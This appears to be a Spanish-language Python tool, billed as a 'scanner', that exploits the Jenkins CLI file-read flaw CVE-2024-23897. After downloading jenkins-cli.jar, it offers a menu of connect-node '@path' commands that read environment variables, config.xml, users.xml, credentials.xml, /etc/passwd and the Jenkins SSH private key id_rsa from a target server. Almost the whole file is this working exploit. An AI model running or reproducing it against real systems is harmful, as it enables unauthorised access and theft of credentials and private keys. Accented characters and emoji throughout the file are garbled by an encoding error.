import os

# FunciÃ³n para descargar jenkins-cli.jar desde la URL ingresada
def descargar_jenkins_cli(url):
    try:
        os.system(f"wget {url}/jnlpJars/jenkins-cli.jar")
        print("jenkins-cli.jar descargado exitosamente. ğŸ– ğŸ– ")
    except Exception as e:
        print(f"Error al descargar jenkins-cli.jar: {e}")

# FunciÃ³n para ejecutar un comando especÃ­fico
def ejecutar_comando(url, comando):
    try:
        print(f"Ejecutando comando: {comando} ğŸ– ")
        os.system(f"java -jar jenkins-cli.jar -s {url} {comando}")
    except Exception as e:
        print(f"Error al ejecutar comando: {e}")

# FunciÃ³n principal del menÃº
def menu(url):
    while True:
        print("\n âš’ï¸ âš’ï¸ âš’ï¸  Seleccione el comando a ejecutar: âš’ï¸ âš’ï¸ âš’ï¸ ")
        print("â˜£ï¸ 1. Obtener informaciÃ³n del servidor (versiÃ³n)")
        print("â˜£ï¸ 2. Obtener informaciÃ³n del entorno")
        print("â˜£ï¸ 3. Obtener configuraciÃ³n de Jenkins")
        print("â˜£ï¸ 4. Obtener informaciÃ³n de los usuarios")
        print("â˜£ï¸ 5. Obtener informaciÃ³n de credenciales")
        print("â˜£ï¸ 6. Realizar lectura de /etc/passwd")
        print("â˜£ï¸ 7. Realizar lectura de /etc/os-release")
        print("â˜£ï¸ 8. Realizar lectura de id_rsa")
        print("â˜£ï¸ 9. Salir")

        opcion = input("OpciÃ³n: ")

        if opcion == "1":
            ejecutar_comando(url, "version")
        elif opcion == "2":
            ejecutar_comando(url, "connect-node '@/proc/self/environ'")
        elif opcion == "3":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/config.xml'")
        elif opcion == "4":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/users/users.xml'")
        elif opcion == "5":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/credentials.xml'")
        elif opcion == "6":
            ejecutar_comando(url, "connect-node '@/etc/passwd'")
        elif opcion == "7":
            ejecutar_comando(url, "connect-node '@/etc/os-release'")
        elif opcion == "8":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/.ssh/id_rsa'")
        elif opcion == "9":
            break
        else:
            print("OpciÃ³n invÃ¡lida. IntÃ©ntalo de nuevo.")

# FunciÃ³n principal
def main():
    print("************************************")
    print("*                                  *")
    print("*        scanner CVE-2024-23897    *")
    print("*          Por: Pulentoski         *")
    print("*          ğŸ•µï¸â€  ğŸ” ğŸ§ â˜£ï¸              *")
    print("*                                  *")
    print("************************************")

    url = input("Ingrese la URL de Jenkins: ğŸ§ ")
    
    # Preguntar si se desea descargar jenkins-cli.jar
    descargar = input("Â¿Desea descargar jenkins-cli.jar? (s/n): ")
    if descargar.lower() == "s":
        descargar_jenkins_cli(url)

    menu(url)

if __name__ == "__main__":
    main()
